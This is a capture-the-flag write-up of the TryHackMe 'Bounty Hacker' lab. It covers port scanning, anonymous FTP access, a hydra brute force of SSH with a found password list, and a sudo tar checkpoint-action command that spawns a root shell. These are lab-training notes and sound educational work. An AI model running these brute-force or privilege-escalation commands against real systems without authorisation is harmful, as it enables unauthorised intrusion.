---
title: Bounty Hacker
date: 2023-07-17
image:
  path: https://miro.medium.com/v2/resize:fit:828/format:webp/0*pSY-gfbX6aNhVPeQ.jpeg
categories: [Write-Ups, TryHackMe]
tags: [TryHackMe, nmap, hydra]
---

## Introduction
*You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!*

## Reconnaissance
Deploy the machine e start with recon!
Starting with a port scan we have the following situation:

``` 
Nmap scan report for 10.10.28.89
Host is up (0.082s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Hint suggest us to look for ftp service.

```shell 
sudo nmap -sV -sC -A 10.10.28.89 -p 21
```

We can connect to ftp service with *anonymous* user.

```shell 
ftp <IP>
```

We have found two txt files.
In one file we find the username and in the other file a password list.

## Getting a shell
With username and a password list we can use hydra to obtain a shell exploiting ssh service.

```shell 
hydra -l lin -P ./locks.txt ssh://10.10.28.89:22
```

We found the password and now we can connect with ssh.

```shell 
ssh lin@<IP>
```

## Privilege Escalation
I launched `sudo -l` and shell returns me this error: 

```
User lin may run the following commands on bountyhacker: 
	(root) /bin/tar
```

So I searched on Google how to obtain a root shell exploiting `/bin/tar`.

I found the following guide: [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

I launched the following command:
```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

and I obtained a root shell.

